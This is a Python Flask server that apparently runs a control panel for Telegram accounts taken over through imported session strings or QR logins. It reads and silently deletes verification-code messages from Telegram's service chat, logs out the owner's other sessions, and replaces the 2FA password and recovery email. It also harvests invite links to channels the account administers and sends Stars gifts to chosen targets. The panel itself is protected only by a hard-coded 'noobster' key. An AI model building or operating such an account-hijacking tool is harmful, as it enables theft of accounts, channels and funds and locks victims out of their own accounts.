import asyncio
import os
import threading
import time
import io
import base64

# 🔥 PYTHON 3.14 FIX
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.tl.types import Channel, Chat, ChannelForbidden
from telethon.tl.types.account import PasswordInputSettings
from telethon.tl.functions.account import (
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    GetPasswordRequest,
    UpdatePasswordSettingsRequest,
    SendVerifyEmailCodeRequest,
    VerifyEmailRequest
)
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import ExportChatInviteRequest, GetExportedChatInvitesRequest, DeleteMessagesRequest
from telethon.tl.functions.payments import GetStarsStatusRequest, SendStarsFormRequest
from telethon.tl.types import InputInvoiceStarGift
import qrcode

app = Flask(__name__)
MASTER_ACCESS_KEY = os.environ.get("MASTER_ACCESS_KEY", "noobster")
accounts = {}
qr_store = {}

def check_auth(req):
    return req.headers.get("Authorization") == "secure_token_noobster"

# ---------- persistent loop ----------
_loop = asyncio.new_event_loop()
threading.Thread(target=_loop.run_forever, daemon=True).start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, _loop).result()

# ---------- auth ----------
@app.route('/api/auth', methods=['POST'])
def auth():
    data = request.json or {}
    if data.get('accessKey') == MASTER_ACCESS_KEY:
        return jsonify({"success": True, "token": "secure_token_noobster"})
    return jsonify({"error": "Invalid Key"}), 401

# ---------- logins ----------
async def login_pyrogram(session_str, api_id, api_hash):
    from pyrogram import Client as PyroClient
    client = PyroClient(":memory:", api_id=api_id, api_hash=api_hash,
                        session_string=session_str, in_memory=True)
    await client.start()
    me = await client.get_me()
    return client, me

async def login_telethon(session_str, api_id, api_hash):
    client = TelegramClient(StringSession(session_str), api_id, api_hash)
    await client.connect()
    if not await client.is_user_authorized():
        await client.disconnect()
        return None, None
    me = await client.get_me()
    return client, me

async def smart_login(session_str, api_id, api_hash):
    if session_str.startswith(("BQ", "1B", "1BV")):
        order = ["pyrogram", "telethon"]
    else:
        order = ["telethon", "pyrogram"]

    last_err = None
    for lib in order:
        try:
            if lib == "pyrogram":
                client, me = await login_pyrogram(session_str, api_id, api_hash)
            else:
                client, me = await login_telethon(session_str, api_id, api_hash)
                if not client:
                    raise ValueError("Telethon: session not authorized")
            return lib, client, me
        except Exception as e:
            last_err = e
            continue
    raise last_err

@app.route('/api/add-account', methods=['POST'])
def add_account():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    session_str = (data.get('session') or '').strip()
    raw_id = data.get('apiId')
    api_hash = (data.get('apiHash') or '').strip()

    if not session_str: return jsonify({"error": "Session required"}), 400
    if not raw_id or not api_hash: return jsonify({"error": "API ID and API Hash required"}), 400
    try:
        api_id = int(raw_id)
    except (TypeError, ValueError):
        return jsonify({"error": "API ID must be numeric"}), 400

    try:
        atype, client, me = run_async(smart_login(session_str, api_id, api_hash))
        accounts[str(me.id)] = {"type": atype, "client": client, "me": me,
                                "api_id": api_id, "api_hash": api_hash, "session": session_str}
        return jsonify({"success": True, "id": str(me.id),
                        "name": getattr(me, 'first_name', 'Unknown') or "Unknown",
                        "type": atype})
    except Exception as e:
        return jsonify({"error": f"Login failed: {str(e)}"}), 500

# ---------- QR login ----------
@app.route('/api/qr-start', methods=['POST'])
def qr_start():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    raw_id = data.get('apiId')
    api_hash = (data.get('apiHash') or '').strip()
    if not raw_id or not api_hash:
        return jsonify({"error": "API ID and API Hash required"}), 400
    try:
        api_id = int(raw_id)
    except (TypeError, ValueError):
        return jsonify({"error": "API ID must be numeric"}), 400

    async def _start():
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        qr = await client.qr_login()
        return client, qr

    try:
        client, qr = run_async(_start())
        qr_id = str(int(time.time() * 1000))
        qr_store[qr_id] = {"qr": qr, "client": client, "api_id": api_id,
                           "api_hash": api_hash, "created": time.time()}
        img = qrcode.make(qr.url)
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        b64 = base64.b64encode(buf.getvalue()).decode()
        return jsonify({"success": True, "qr_id": qr_id, "qr_image": f"data:image/png;base64,{b64}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/qr-poll/<qr_id>', methods=['GET'])
def qr_poll(qr_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if qr_id not in qr_store:
        return jsonify({"status": "expired"}), 404
    entry = qr_store[qr_id]
    qr, client = entry["qr"], entry["client"]

    async def _check():
        try:
            await qr.wait(timeout=1)
            me = await client.get_me()
            return ("done", me)
        except asyncio.TimeoutError:
            if time.time() - entry["created"] > 60:
                return ("expired", None)
            return ("pending", None)
        except Exception:
            return ("pending", None)

    status, me = run_async(_check())
    if status == "done":
        accounts[str(me.id)] = {"type": "telethon", "client": client, "me": me,
                                "api_id": entry["api_id"], "api_hash": entry["api_hash"], "session": ""}
        del qr_store[qr_id]
        return jsonify({"status": "done", "id": str(me.id), "name": getattr(me, 'first_name', 'Unknown')})
    elif status == "expired":
        run_async(client.disconnect())
        del qr_store[qr_id]
        return jsonify({"status": "expired"})
    return jsonify({"status": "pending"})

# ---------- accounts ----------
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    out = []
    for acc_id, d in accounts.items():
        me = d['me']
        out.append({
            "id": acc_id,
            "name": getattr(me, 'first_name', 'Unknown') or "Unknown",
            "phone": getattr(me, 'phone_number', 'Hidden'),
            "type": d['type'],
            "photo": f"https://ui-avatars.com/api/?name={getattr(me, 'first_name', 'U')}&background=2b5278&color=fff"
        })
    return jsonify(out)

@app.route('/api/chats/<acc_id>', methods=['GET'])
def get_chats(acc_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    return jsonify([{"id": "777000", "name": "Telegram (Notification Bot)",
                     "lastMsg": "Verification codes and service updates"}])

# ---------- messages ----------
@app.route('/api/messages/<acc_id>/<chat_id>', methods=['GET'])
def get_messages(acc_id, chat_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    d = accounts[acc_id]; client, atype = d['client'], d['type']
    try:
        if atype == 'pyrogram':
            async def fetch():
                msgs = []
                async for m in client.get_chat_history(int(chat_id), limit=20):
                    msgs.append(m)
                return msgs
            messages = run_async(fetch())
            out = [{"id": m.id, "text": (m.text or "[Media]"), "isMine": bool(m.outgoing)} for m in reversed(messages)]
        else:
            async def fetch():
                entity = await client.get_entity(int(chat_id))
                return await client.get_messages(entity, limit=20)
            messages = run_async(fetch())
            out = [{"id": m.id, "text": m.message or "[Media]", "isMine": bool(m.out)} for m in reversed(messages)]
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": f"Msg Error: {str(e)}"}), 500

@app.route('/api/delete-notif', methods=['POST'])
def delete_notification():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    acc_id = data.get('acc_id')
    msg_ids = data.get('msg_ids', [])
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    if not msg_ids: return jsonify({"error": "msg_ids required"}), 400
    acc = accounts[acc_id]; client = acc['client']
    if acc['type'] != 'telethon':
        return jsonify({"error": "Delete only supported for Telethon."}), 400

    async def _del():
        try:
            await client(DeleteMessagesRequest(id=msg_ids, revoke=True))
            return {"success": True, "message": f"Deleted {len(msg_ids)} message(s)."}
        except Exception as e:
            return {"error": str(e)}

    out = run_async(_del())
    if "error" in out:
        return jsonify(out), 500
    return jsonify(out)

# ---------- stars ----------
@app.route('/api/stars/<acc_id>', methods=['GET'])
def get_stars(acc_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    acc = accounts[acc_id]; client = acc['client']
    if acc['type'] != 'telethon':
        return jsonify({"error": "Stars only supported for Telethon."}), 400

    async def _get():
        try:
            res = await client(GetStarsStatusRequest(peer='me'))
            bal = getattr(res.balance, 'amount', None)
            if bal is None:
                bal = getattr(res, 'balance', 0)
            return {"balance": int(bal) if bal else 0}
        except Exception as e:
            return {"error": str(e)}

    out = run_async(_get())
    if "error" in out:
        return jsonify(out), 500
    return jsonify(out)

@app.route('/api/send-stars', methods=['POST'])
def send_stars():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    acc_id = data.get('acc_id')
    target = (data.get('target') or '').strip()
    amount = int(data.get('amount', 0))
    gift_id = data.get('gift_id')

    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    if not target or amount <= 0:
        return jsonify({"error": "Target and amount required"}), 400

    acc = accounts[acc_id]; client = acc['client']
    if acc['type'] != 'telethon':
        return jsonify({"error": "Stars only supported for Telethon."}), 400

    async def _send():
        try:
            peer = await client.get_input_entity(target)
            if gift_id:
                invoice = InputInvoiceStarGift(peer=peer, gift_id=int(gift_id))
                form = await client(functions.payments.GetPaymentFormRequest(invoice=invoice))
                await client(SendStarsFormRequest(form_id=form.form_id, invoice=invoice))
                return {"success": True, "message": f"Gift sent to {target}"}
            else:
                return {"error": "Direct Stars transfer not supported. Use gift_id."}
        except Exception as e:
            return {"error": str(e)}

    out = run_async(_send())
    if "error" in out:
        return jsonify(out), 500
    return jsonify(out)

# ---------- deep link resolve ----------
async def _resolve_channel_link(client, entity):
    username = getattr(entity, "username", None)
    if not username:
        try:
            fresh = await client.get_entity(entity.id)
            username = getattr(fresh, "username", None)
            if username: return username, None
        except Exception: pass
    if not username and isinstance(entity, Channel):
        try:
            full = await client(GetFullChannelRequest(channel=entity))
            ch = full.chats[0]
            username = getattr(ch, "username", None)
            if username: return username, None
        except Exception: pass
    try:
        inv = await client(ExportChatInviteRequest(peer=entity))
        if getattr(inv, "link", None): return None, inv.link
    except Exception: pass
    try:
        res = await client(GetExportedChatInvitesRequest(peer=entity, admin_id="me", limit=5))
        for inv in (getattr(res, "invites", []) or []):
            if getattr(inv, "link", None): return None, inv.link
    except Exception: pass
    return username, None

# ---------- profile ----------
@app.route('/api/profile/<acc_id>', methods=['GET'])
def get_profile(acc_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    d = accounts[acc_id]; me = d['me']; client = d['client']
    try:
        has_2fa = False; devices = []; admin_chats = []

        if d['type'] == 'pyrogram':
            async def fetch_pyro():
                fa = False
                try:
                    hint = await client.get_password_hint()
                    fa = hint is not None
                except Exception: fa = False
                devs = []
                try:
                    async for s in client.get_active_sessions():
                        devs.append({"device": getattr(s, "device_model", "Unknown"),
                                     "ip": getattr(s, "ip", "-"),
                                     "current": bool(getattr(s, "current", False))})
                except Exception: pass
                admins = []
                try:
                    async for dlg in client.get_dialogs(limit=200):
                        ch = getattr(dlg, "chat", None)
                        if ch is None: continue
                        ctype = str(getattr(ch, "type", "")).lower()
                        if not any(k in ctype for k in ("channel", "group", "supergroup")): continue
                        try:
                            member = await client.get_chat_member(ch.id, "me")
                            status = str(getattr(member, "status", "")).lower()
                            if "owner" not in status and "administrator" not in status: continue
                            is_owner = "owner" in status
                            username = getattr(ch, "username", None)
                            invite = None
                            if not username:
                                try:
                                    full = await client.get_chat(ch.id)
                                    username = getattr(full, "username", None)
                                except Exception: pass
                            if not username:
                                try: invite = await client.export_chat_invite_link(ch.id)
                                except Exception: invite = None
                            admins.append({"name": getattr(ch, "title", "Unnamed"),
                                           "type": "Owner" if is_owner else "Admin",
                                           "username": username, "invite_link": invite})
                        except Exception: pass
                except Exception: pass
                return fa, devs, admins
            has_2fa, devices, admin_chats = run_async(fetch_pyro())
        else:
            async def fetch_tele():
                pwd_info = await client(GetPasswordRequest())
                auths = await client(GetAuthorizationsRequest())
                devs = [{"device": a.device_model, "ip": a.ip, "current": a.current}
                        for a in auths.authorizations]
                admins = []
                async for dialog in client.iter_dialogs(limit=200):
                    ent = dialog.entity
                    if not isinstance(ent, (Channel, Chat)) or isinstance(ent, ChannelForbidden): continue
                    try:
                        perms = await client.get_permissions(ent, "me")
                        if not (perms.is_admin or perms.is_creator): continue
                        username, invite = await _resolve_channel_link(client, ent)
                        admins.append({"name": dialog.name,
                                       "type": "Owner" if perms.is_creator else "Admin",
                                       "username": username, "invite_link": invite})
                    except Exception: pass
                return pwd_info.has_password, devs, admins
            has_2fa, devices, admin_chats = run_async(fetch_tele())

        return jsonify({
            "name": getattr(me, 'first_name', 'Unknown'), "id": str(me.id),
            "username": getattr(me, 'username', 'None'),
            "phone": getattr(me, 'phone_number', 'Hidden'),
            "has_2fa": bool(has_2fa), "devices": devices, "admin_chats": admin_chats
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---------- terminate ----------
@app.route('/api/terminate', methods=['POST'])
def terminate_sessions():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    acc_id, action = data.get('acc_id'), data.get('action')
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    acc = accounts[acc_id]; client = acc['client']
    if acc['type'] != 'telethon':
        return jsonify({"error": "Terminate only supported for Telethon."}), 400

    async def _terminate():
        try:
            if action == "all":
                auths = await client(GetAuthorizationsRequest())
                count = 0
                for a in auths.authorizations:
                    if not a.current:
                        try:
                            await client(ResetAuthorizationRequest(hash=a.hash))
                            count += 1
                        except Exception as e:
                            if "FRESH_RESET" in str(e):
                                return ("FRESH_RESET", 0)
                            raise
                return ("OK", count)
            elif action == "current":
                await client.log_out()
                return ("OK", 1)
        except Exception as e:
            return ("ERROR", str(e))

    result, val = run_async(_terminate())
    if result == "FRESH_RESET":
        return jsonify({"error": "Telegram blocks terminating sessions if current session is less than 24 hours old."}), 403
    if result == "ERROR":
        return jsonify({"error": val}), 500
    if action == "current":
        del accounts[acc_id]
    return jsonify({"success": True, "message": f"Terminated {val} session(s)."})

# ---------- 2FA ----------
@app.route('/api/change-2fa', methods=['POST'])
def change_2fa():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    acc_id = data.get('acc_id')
    current_pass = data.get('current_password', '')
    new_pass = data.get('new_password')
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    acc = accounts[acc_id]; client = acc['client']
    if acc['type'] != 'telethon':
        return jsonify({"error": "2FA only supported for Telethon."}), 400

    async def _edit():
        try:
            await client.edit_2fa(
                current_password=current_pass if current_pass else None,
                new_password=new_pass,
                hint="Reset via Panel"
            )
            return "SUCCESS"
        except Exception as e:
            return f"FAIL: {e}"

    result = run_async(_edit())
    if result == "SUCCESS":
        return jsonify({"success": True, "message": "2FA password changed."})
    return jsonify({"error": result}), 500

# ---------- email ----------
@app.route('/api/request-email-otp', methods=['POST'])
def request_email_otp():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    acc_id, new_email = data.get('acc_id'), data.get('new_email')
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    acc = accounts[acc_id]; client = acc['client']
    if acc['type'] != 'telethon':
        return jsonify({"error": "Email change only supported for Telethon."}), 400
    async def send_otp(): await client(SendVerifyEmailCodeRequest(email=new_email))
    run_async(send_otp())
    return jsonify({"success": True, "message": "OTP sent to new email."})

@app.route('/api/verify-email-otp', methods=['POST'])
def verify_email_otp():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    acc_id, new_email, otp = data.get('acc_id'), data.get('new_email'), data.get('otp_code')
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404
    acc = accounts[acc_id]; client = acc['client']
    async def verify(): await client(VerifyEmailRequest(email=new_email, code=otp))
    run_async(verify())
    return jsonify({"success": True, "message": "Email changed successfully."})

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
